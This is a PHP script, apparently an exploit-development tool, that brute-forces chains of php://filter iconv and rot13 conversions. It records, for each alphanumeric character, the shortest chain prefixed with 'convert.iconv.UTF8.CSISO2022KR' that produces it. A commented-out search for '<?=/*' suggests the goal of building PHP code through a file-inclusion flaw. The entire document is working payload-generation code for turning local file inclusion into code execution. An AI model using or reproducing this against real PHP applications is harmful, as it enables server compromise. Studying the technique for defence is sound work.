<?php
error_reporting(E_ALL & ~E_WARNING);
ini_set("memory_limit", "-1");
set_time_limit(0);
$input = $argv[1];
$iconv_list = [
    'ISO-10646-UCS-4',
    'UTF-32',
    'UCS-2LE',
    'UCS-2BE',
    'UCS-4LE',
    'UCS-4BE',
    'ISO-10646-UCS-2',
    'UTF-32BE',
    'UTF-32LE',
    'UTF-16',
    'UTF-16BE',
    'UTF-16LE',
    'UTF-8',
    'UTF-7',
    'US-ASCII',
    'EUC-JP',
    'Shift_JIS',
    'ISO-2022-JP',
    'ISO-8859-1',
    'ISO-8859-2',
    'ISO-8859-3',
    'ISO-8859-4',
    'ISO-8859-5',
    'ISO-8859-6',
    'ISO-8859-7',
    'ISO-8859-8',
    'ISO-8859-9',
    'ISO-8859-10',
    'ISO-8859-13',
    'ISO-8859-14',
    'ISO-8859-15',
    'ISO-8859-16',
    'EUC-CN',
    'CP936',
    'HZ',
    'EUC-TW',
    'CP950',
    'BIG-5',
    'EUC-KR',
    'UHC',
    'ISO-2022-KR',
    'Windows-1251',
    'Windows-1252',
    'CP866',
    'KOI8-R',
    'KOI8-U',
    'CP1025',
    'IBM1154'
];
$filter_list = [
    'string.rot13',
    'convert.iconv.*',
];
print_r($filter_list);
$prev_str = "";
$news = "";
$op_all = "";
$found_count = 0;
$op_all_max = 20000;

$init_value = file_get_contents($input);
$max_c_len = strlen($init_value) * 5;
while(1){
    $tmp_str = "";
    $rand = rand(1,999999);
    $op = '';
    if($rand % 6 > 1){
        $rand_2 = rand(1,999999);
        $rand_3 = rand(1,999999);
        $icon1 = $iconv_list[$rand_2 % count($iconv_list)];
        $icon2 = $iconv_list[$rand_3 % count($iconv_list)];
        $op = str_replace('*',$icon1.'.'.$icon2,$filter_list[1]);
    }
    else{
        $op =  $filter_list[0];
    }
    $tmp_str = file_get_contents('php://filter/'.$op_all.(($op_all == "")?'':'|').$op.'/resource='.$input);
    if(!$tmp_str){
        continue;
    }
    if($tmp_str === $prev_str){
        continue;
    }
    if(strlen($op_all)>$op_all_max){
        $op_all = "";
        continue;
    }
    if(strlen($tmp_str) > $max_c_len){
        $op_all = "";
        continue;
    }
    preg_match_all("/([a-zA-Z0-9]{1})/",$tmp_str, $res);
    if(sizeof($res[1])==1){
        //$ttt = quoted_printable_encode($tmp_str);
            echo "[!!] Magic:\n ------------------------------------------\n " . $tmp_str . "\n";
            if(file_exists("/tmp/a/".$res[1][0])){
                $size = strlen(file_get_contents("/tmp/a/".$res[1][0]));
                if($size>strlen("php://filter/" . $op_all.(($op_all == "")?'':'|').$op . '/resource=' . $input)){
                    file_put_contents("/tmp/a/" . $res[1][0], "convert.iconv.UTF8.CSISO2022KR|" . $op_all.(($op_all == "")?'':'|').$op);
                }
            }
            else{
                file_put_contents("/tmp/a/" . $res[1][0], "convert.iconv.UTF8.CSISO2022KR|" . $op_all.(($op_all == "")?'':'|').$op);

            }
    }
    if($tmp_str === $init_value){
        $op_all = "";
        continue;
    }
    else{

        $prev_str = $tmp_str;
        $op_all .= (($op_all == "")?'':'|').$op;
        /*
        $find_str = '<?=/*';
        if(strpos($tmp_str,$find_str)!== false){
            $found_count += 1;
            file_put_contents("/tmp/res".(string)$found_count,"php://filter/".$op_all.'/resource='.$input."\n\n".$find_str);
            echo "[+] current found: ".(string)$found_count."\n";
        }*/

    }

}
?>
